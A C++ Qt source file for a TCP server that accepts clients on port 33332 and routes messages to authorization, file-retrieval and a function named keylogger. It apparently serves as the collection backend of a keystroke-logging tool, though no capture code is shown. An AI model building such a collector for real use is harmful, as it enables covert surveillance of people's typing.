#include "mytcpserver.h"
#include "functions.h"

MyTcpServer::~MyTcpServer()
{
    // Отключение всех клиентов
    foreach(int i, SClients.keys()){
        QTextStream os(SClients[i]);
        SClients[i] -> close();
        SClients.remove((i));
    }
    mTcpServer->close();
    server_status=0;
}
MyTcpServer::MyTcpServer(QObject *parent) : QObject(parent){
    // Создание нового сервера
    mTcpServer = new QTcpServer(this);
    connect(mTcpServer, &QTcpServer::newConnection,
            this, &MyTcpServer::slotNewConnection);

    if(!mTcpServer->listen(QHostAddress::Any, 33332)){
        qDebug() << "Server is not started";
    } else {
        server_status=1;
        qDebug() << "Server is started";
    }

    // Получение ip-адреса
    const QHostAddress &localhost = QHostAddress(QHostAddress::LocalHost);
    for (const QHostAddress &address: QNetworkInterface::allAddresses()) {
        if (address.protocol() == QAbstractSocket::IPv4Protocol && address != localhost)
             qDebug() << address.toString();
    }
}

void MyTcpServer::slotNewConnection(){
    // Обработка нового подключения
    if(server_status==1){
        QTcpSocket* clientSocket=mTcpServer->nextPendingConnection();
        int idusersocs = (int)clientSocket->socketDescriptor();
        SClients[idusersocs]=clientSocket;
        connect(SClients[idusersocs], &QTcpSocket::readyRead,this,&MyTcpServer::slotServerRead);
        connect(SClients[idusersocs],&QTcpSocket::disconnected,this,&MyTcpServer::slotClientDisconnected);

        qDebug() << QString::fromUtf8("Client is connected");
    }
}

void MyTcpServer::slotServerRead(){
    // Чтение и обработка сообщений, приходящих с клиентов
    QTcpSocket *clientSocket = (QTcpSocket*)sender();
    int id = (int)clientSocket->socketDescriptor();
    while(clientSocket->bytesAvailable()>0)
    {
        QString result;

        // Чтение сообщения
        QByteArray array = clientSocket->readAll();
        std::string message = array.toStdString();

        // Обработка сообщения
        if (message.substr(0, 4) == "auth"){
            message = message.substr(5);
            result = authorize(message);
        } else if (message.substr(0, 4) == "file"){
            message = message.substr(5);
            result = get_file(message);
        } else {
            message = message.substr(5);
            result = keylogger(message);
        }

        // Формирование результата
        qDebug() << "result = " << result;
        clientSocket->write(result.toUtf8().constData());
    }
}

void MyTcpServer::slotClientDisconnected(){
    // Обработка отключения
    QTcpSocket *clientSocket = (QTcpSocket*)sender();
    int id = (int)clientSocket->socketDescriptor();
    clientSocket->close();
    SClients.remove(id);
    qDebug() << QString::fromUtf8("Client is disconnected");
}
